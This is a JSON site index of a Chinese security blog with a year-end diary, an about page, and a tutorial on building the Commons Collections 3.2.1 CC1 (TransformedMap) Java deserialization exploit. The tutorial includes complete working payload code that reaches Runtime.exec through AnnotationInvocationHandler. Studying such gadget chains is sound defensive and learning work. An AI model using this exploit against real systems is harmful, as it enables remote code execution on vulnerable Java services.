[{"categories":null,"content":" 友情链接 Stilig's blog 一个分享自己杂七杂八知识的网站 ","date":"2024-03-21","objectID":"/friend/:0:0","series":null,"tags":null,"title":"Friend","uri":"/friend/#友情链接"},{"categories":null,"content":" 欢迎留言互换友链 友链格式如下 friend name=\"xxx's blog\" url=\"https://xxx.com\" logo=\"https://xxx/xxx.png\" word=\"描述词\" ","date":"2024-03-21","objectID":"/friend/:0:0","series":null,"tags":null,"title":"Friend","uri":"/friend/#欢迎留言互换友链"},{"categories":["life"],"content":"迟来的总结...","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"},{"categories":["life"],"content":" 回顾20232023年末时看着大伙们都在写年终总结，但我却迟迟未动笔，原因有二：其一呢，就是因为自身太懒了，不想写。其二就是因为之前的博客没了，一直没有修。。。好吧其实也就是懒的去搞了呜呜呜 2023算是最好玩的一年，见识最多的一年，也是最摆烂的一年 ","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#回顾2023"},{"categories":["life"],"content":" 1 工作2023年三月份就开始在投简历了，之后也是去了南京的赛宁，暑假前在线上实习也是挺舒服的，做的东西也是ctf相关的，算是躺在舒适圈内。九月份离开了赛宁开始秋招简历投递，可能是学的东西太少了，导致offer甚少，基本没有网安大厂的offer呜呜呜，于是来到了长沙这家公司实习，做渗透相关的工作，由于没太接触过渗透，一开始还是有点压力的，不过师傅们人都很好，也没有紧急的时刻。 ","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#工作"},{"categories":["life"],"content":" 2 学习这一年接触的java安全相关的知识，不过由于断断续续的摆烂导致也没学太多东西。有幸竞赛方面迎来了大学时期的高光时刻，也和团队许多师傅们线下面基了 大学生信息安全竞赛 鹏城杯线下面基 ","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#学习"},{"categories":["life"],"content":" 3 生活主要是去过很多地方玩哈哈哈 武功山爬山 坐飞机去成都 武汉科技大学打比赛 上海 南京牛首山 长沙 漫展上大佬的涂鸦都这么好看 入手mac ","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#生活"},{"categories":["life"],"content":" 展望2024 岁月本长，而忙者自促 天地本宽，而鄙者自隘 风花雪月本闲，而扰攘者自冗 首先是希望能够把身体健康重视起来，23年一年来由于长期久坐导致胖了十斤（虽然也有运动 (¦3」∠)） ，不锻炼身体迟早会垮。还有就是少点外卖，周末学学咋做饭 然后就是希望能够提高学习的效率，不要陷入摆烂循环里面去（可以稍微摆一会hh） 好啦下面到了立flag时间 1、和女朋友一直好下去！！！ 2、对线完java的反序列链子和内存马 3、看完《计算》、《毛选》两本书 4、审出2个有价值的java高危漏洞，提交cve、cnvd 5、学习挖src，挖到1个阿里、腾讯等大厂漏洞 6、保持身体健康，别继续胖了 ","date":"2024-02-18","objectID":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":["life"],"title":"2023年终总结","uri":"/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/#展望2024"},{"categories":["JavaSecurity"],"content":"学习java反序列化的第一条cc链","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/"},{"categories":["JavaSecurity"],"content":" java反序列化漏洞之Commons-Collection1 TransformMap链","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:0:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#java反序列化漏洞之commons-collection1-transformmap链"},{"categories":["JavaSecurity"],"content":" 1 前言关于CC1链其实是有两条的，一个是LazyMap这一条链，另外一条就是TransformMap链，第二条链是传入国内之后被发现的。这几周学了学java反序列化漏洞，来试试手写一下CC1链的payload帮助我更好的理解。 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:1:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#前言"},{"categories":["JavaSecurity"],"content":" 2 环境搭建","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:2:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#环境搭建"},{"categories":["JavaSecurity"],"content":" 2.1 jdk 版本jdk 版本 8u65 下载地址： JDK 8（Java SE Development Kit）全平台全版本安装包免费下载 - 码霸霸 (lupf.cn) 可以将其在虚拟机中安装之后再拷出来 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:2:1","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#jdk-版本"},{"categories":["JavaSecurity"],"content":" 2.2 maven有漏洞的版本为 \u003c!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --\u003e \u003cdependency\u003e \u003cgroupId\u003ecommons-collections\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections\u003c/artifactId\u003e \u003cversion\u003e3.2.1\u003c/version\u003e \u003c/dependency\u003e ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:2:2","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#maven"},{"categories":["JavaSecurity"],"content":" 2.3 openjdk为了调试时能够看到源码，我们需要下载对应版本的 openjdk jdk8u/jdk8u/jdk: af660750b2f4 (java.net) 点击下载即可 然后解压出来,找到这个目录下的 sun 包，将其复制到 jdk8u65 中 src.zip 解压候的 src 文件夹中 jdk-af660750b2f4\\jdk-af660750b2f4\\src\\share\\classes ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:2:3","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#openjdk"},{"categories":["JavaSecurity"],"content":" 2.4 idea 设置添加 src 文件夹到 sdks 之后就能看到源码了 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:2:4","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#idea-设置"},{"categories":["JavaSecurity"],"content":" 3 攻击链分析 反序列化攻击思路 首先需要一个 readObject 方法作为入口类，在结尾处需要一个能够调用命令执行的方法，通过链子链接过去，就达成了一次反序列化攻击。 所以我们的攻击链应该是从后往前去寻找的。 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:3:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#攻击链分析"},{"categories":["JavaSecurity"],"content":" 3.1 寻找尾部exec方法这一步就是寻找哪个方法可以调用exec方法，前人已经帮我们找到了，在Transformer接口中。 可以看到InvokerTransformer实现了这个接口，然后其transform方法调用了invoke方法，我们可以通过它来调用exec方法达到命令执行 我们来尝试构造一下，调用这个类的命令执行，首先我们回顾一下如何通过反射调用来执行命令 public class Demo { public static void main(String[] args)throws Exception { Runtime r = Runtime.getRuntime(); Class c = r.getClass(); Method cMethod = c.getMethod(\"exec\", String.class); cMethod.invoke(r,\"calc\"); } } 接下来把他改写成利用InvokerTransformer类弹计数器。由于是public方法故无需反射 public class Demo { public static void main(String[] args)throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); invokerTransformer.transform(r); } } 之后就再去寻找调用transform方法的不同名函数，因为我们代码的最后一句是这样的invokerTransformer.transform(r); ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:3:1","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#寻找尾部exec方法"},{"categories":["JavaSecurity"],"content":" 3.2 寻找调用链右键transform–\u003e查找用法，或者Alt+F7也可以，这里发现有很多都调用了transform，但最终我们用到的是TransformdMap这个类 这个类中的checkSetValue方法中调用了transform方法 protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } 我们再往上看一下这个valueTransformer是这么来的 protected final Transformer valueTransformer; protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } 它是TransformedMap中的一个变量，通过构造函数来给他赋值，但构造方法是一个protected类型，只有在本类中才能调用，继续看发现有一个public静态方法直接返回了这个类的构造方法 故我们控制这个valueTransformer为invokerTransformer类，然后调用这个checkSetValue方法就能弹计数器了，我们尝试构造一下POC public class Demo { public static void main(String[] args)throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap\u003cObject,Object\u003e hashMap = new HashMap\u003c\u003e(); Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer); Class\u003cTransformedMap\u003e transformedMapClass = TransformedMap.class; Method checkSetValueMethod = transformedMapClass.getDeclaredMethod(\"checkSetValue\", Object.class); checkSetValueMethod.setAccessible(true); checkSetValueMethod.invoke(decorateMap,r); } } 可以看到这里成功了，然后再通过同样的方式去寻找哪个类方法中调用了checkSetValue方法，这里我们找到的是AbstractInputCheckedMapDecorator类也就是TransformedMap类的父类中 调用checkSetValue方法的类是AbstractInputCheckedMapDecorator类中的一个内部类MapEntry setValue方法其实就是给键值对中的值进行赋值操作的一个方法。接下来我们就是要找到哪个类中调用了setValue方法，如果是readObject类中调用了setValue方法那就成功找到这条链子了。 真是太巧了！ 在AnnotationInvocationHandler类中的readObject方法中调用了setValue方法，但是要通过两个验证 成员不为空 memberType不是一个实例 接下来我们来尝试构造EXP ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:3:2","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#寻找调用链"},{"categories":["JavaSecurity"],"content":" 4 TransformedMap 版CC1 EXP这是理想情况下的payload package org.example; import java.io.*; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class Demo { public static void main(String[] args)throws Exception { Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}); HashMap\u003cObject,Object\u003e hashMap = new HashMap\u003c\u003e(); hashMap.put(\"key\",\"value\"); Map\u003cObject,Object\u003e decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(new Class[]{Class.class, Map.class}); annotationInvocationHandlerConstructor.setAccessible(true); Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, decorateMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } 但是没有弹出计数器，是因为这里有三个问题我们还没解决 Runtime对象不能被序列化，因为它没有继承Serializable接口 setValue传入的对象应该是Runtime对象的，而在实际情况中确是AnnotationTypeMismatchExceptionProxy 通过两个if判断 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:4:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#transformedmap-版cc1-exp"},{"categories":["JavaSecurity"],"content":" 4.1 解决Runtime不能序列化的问题Runtime是不能序列化的，但是Runtime.class是可以序列化的。我们先写一遍普通反射。 Class c = Runtime.class; Method getRuntimeMethod = c.getMethod(\"getRuntime\"); Runtime Runtime = (Runtime) getRuntimeMethod.invoke(null, null); Method cMethod = c.getMethod(\"exec\", String.class); cMethod.invoke(Runtime,\"calc\"); 接着将这个反射的Runtime改造为使用InvokerTransformer调用的方式 Method getRuntimeMethod =(Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class); Runtime r = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod); new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r); 由于这里new 了太多次了，且是同样的操作，我们可以用ChainedTransformer类去套，减少工作量 Transformer[] transformers= new Transformer[]{ new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}) }; Transformer chainedTransformer = new ChainedTransformer(transformers); 至此，第一个问题就解决了 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:4:1","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#解决runtime不能序列化的问题"},{"categories":["JavaSecurity"],"content":" 4.2 解决传入的对象不为为Runtime的对象通过寻找存在这样的一个类 他的transform方法中会给你返回构造函数中接收的参数，这个正是我们需要的，现在我们的exp变成了这样 Transformer[] transformers= new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}) }; Transformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"kkk\",\"aaa\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationHdConstructor = c.getDeclaredConstructor(new Class[]{Class.class,Map.class}); //获取类的构造方法 annotationInvocationHdConstructor.setAccessible(true); //保证可以访问 Object o = annotationInvocationHdConstructor.newInstance(Override.class, transformedMap); serialize(o); unserialize(\"ser.bin\"); 最上面传入了Runtime的类对象 但这个exp还是不能弹计数器，没有通过第两个if判断 由于memberTypes为空导致进不去，这个memberTypes是获取注解中的值的，而Override注解没有值，故进不去，所以我们只要找到一个有值的注解就行了，这里用的是Target注解 可以看到它有一个value值（这个不是函数哦），所以我们hashmap.put也需要修改为value。 map.put(\"kkk\",\"aaa\"); --\u003emap.put(\"value\",\"aaa\"); 现在我们就能成功的弹计算器了。 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:4:2","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#解决传入的对象不为为runtime的对象"},{"categories":["JavaSecurity"],"content":" 5 最终EXP package org.example; import java.io.*; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class Demo { public static void main(String[] args)throws Exception { Transformer[] transformers= new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}) }; Transformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationHdConstructor = c.getDeclaredConstructor(new Class[]{Class.class,Map.class}); //获取类的构造方法 annotationInvocationHdConstructor.setAccessible(true); //保证可以访问 Object o = annotationInvocationHdConstructor.newInstance(Target.class, transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } } ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:5:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#最终exp"},{"categories":["JavaSecurity"],"content":" 6 小结我们来梳理一下利用链 利用链： InvokerTransformer#transform TransformedMap#checkSetValue AbstractInputCheckedMapDecorator#setValue AnnotationInvocationHandler#readObject 使用到的工具类辅助利用链： ConstantTransformer ChainedTransformer HashMap 大概流程图如下 ","date":"2023-03-21","objectID":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/:6:0","series":null,"tags":["Java反序列化"],"title":"如何手写一条cc链","uri":"/%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E6%9D%A1cc%E9%93%BE/#小结"},{"categories":null,"content":" 主题文档 - 基本概念 探索 Hugo - DoIt 主题的全部内容和背后的核心概念 阅读全文 主题文档 - 内容 了解如何在 DoIt 主题中快速, 直观地创建和组织内容 阅读全文 主题文档 - 扩展 Shortcodes DoIt 主题在 Hugo 内置的 shortcode 的基础上提供多个扩展的 shortcode 阅读全文 ","date":"2021-11-01","objectID":"/showcase/:0:0","series":null,"tags":null,"title":"作品","uri":"/showcase/#"},{"categories":null,"content":" About me ID:lengf233 星盟安全团队成员 退役CTF选手web dog一枚 ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"","uri":"/about/#about-me"},{"categories":null,"content":" self想要学技术却又经常犯懒癌，但看到@星盟安全团队的师傅们孜孜不倦的学习，我又怎能停下学习的脚步呢？ 本博客用来督促自己学习，分享最近学到的东西，包括但不限于CTF、内网渗透、代码审计、java安全。希望能和各位师傅多多交流，共同成长！ ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"","uri":"/about/#self"},{"categories":null,"content":" concatqq: 2083282360 ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"","uri":"/about/#concat"},{"categories":null,"content":" You are not connected to the Internet, only cached pages will be available. ","date":"0001-01-01","objectID":"/offline/:0:0","series":null,"tags":null,"title":"Offline","uri":"/offline/#"}]